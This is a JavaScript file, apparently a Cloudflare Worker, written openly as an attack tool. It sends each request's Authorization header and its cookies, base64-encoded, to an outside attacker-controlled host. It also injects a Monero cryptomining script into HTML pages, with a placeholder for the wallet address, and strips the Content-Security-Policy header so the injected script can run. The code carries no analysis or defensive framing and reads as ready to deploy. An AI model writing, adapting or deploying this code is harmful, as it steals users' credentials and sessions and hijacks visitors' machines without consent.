addEventListener('fetch', event => {
  event.respondWith(handleRequest(event, event.request));
});

// Main request handler
async function handleRequest(event, request) {
  await stealAuthorizationHeader(request);

  response = await fetch(request);

  modifiedResponse = await injectMaliciousScript(response);
  await stealCookies(request, response);

  return modifiedResponse;
}

// Utility function to exfiltrate data to an attacker-controlled server
async function log(data) {
  // Note: don't use a hardcoded IP, Cloudflare blocks direct IP access for outbound connections
  await fetch("http://46.101.191.103.nip.io/log/" + btoa(data));
}

// Exfiltrates Authorization headers
async function stealAuthorizationHeader(request) {
  const authz = request.headers.get("Authorization")
  if (authz) {
    await log(`authorization header: ${authz}`)
  }
}

// Exfiltrates cookies
async function stealCookies(request, response) {
  cookies = response.headers.get("Set-Cookie")
  if (cookies) {
    await log(`cookies sent by server: ${cookies}`);
  }

  cookies = request.headers.get("Cookie")
  if (cookies) {
    await log(`cookies sent by client: ${cookies}`);
  }
}

// Injects a malicious Javascript script in HTML responses
async function injectMaliciousScript(originalResponse) {
  // Only inject our script in HTML responses
  if (!originalResponse.headers.get("Content-Type").includes("html")) {
    return originalResponse;
  }

  originalHtml = await originalResponse.text();

  // Malicious script to inject
  const script = `
    <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
    <script>
      server = "wss://f.xmrminingproxy.com:8181";
      var pool = "moneroocean.stream";
      var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
      var workerId = ""
      var threads = -1;
      var password = "x";
      startMining(pool, walletAddress, workerId, threads, password);
      throttleMiner = 20;
    </script>
  `
  modifiedHtml = originalHtml.replace("</body>", script + "</body>")
  modifiedResponse = new Response(modifiedHtml, originalResponse)

  // Get rid of any annoying content security policy that would block our script
  if (modifiedResponse.headers.get("Content-Security-Policy")) {
    modifiedResponse.headers.delete("Content-Security-Policy")
  }

  return modifiedResponse
}